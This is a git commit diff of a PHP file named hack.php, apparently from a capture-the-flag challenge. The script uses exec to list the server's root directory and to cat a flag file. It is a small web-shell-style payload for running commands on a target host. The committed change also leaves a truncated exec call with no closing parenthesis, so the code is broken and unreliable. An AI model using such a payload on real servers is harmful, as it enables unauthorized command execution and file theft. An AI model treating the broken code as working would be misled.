60ac6c56dff8310b489ae72a7d97de8e55dce0dc
yeungsinchun <98640709+yeungsinchun@users.noreply.github.com>
2023-09-03 01:00:28 +0800

    Update hack.php

--- hack.php
+++ hack.php
@@ -5,6 +5,8 @@ $output=null;
 $retval=null;
 exec('ls /', $output, $retval);
 print_r($output);
-exec('cat flag-e3deebb27b56053dd7041cf93d1499f4', $output, $retval);
+print_r($retval);
+exec('cat flag-e3deebb27b56053dd7041cf93d1499f4', $output,
 print_r($output);
+print_r($retval);
 ?>
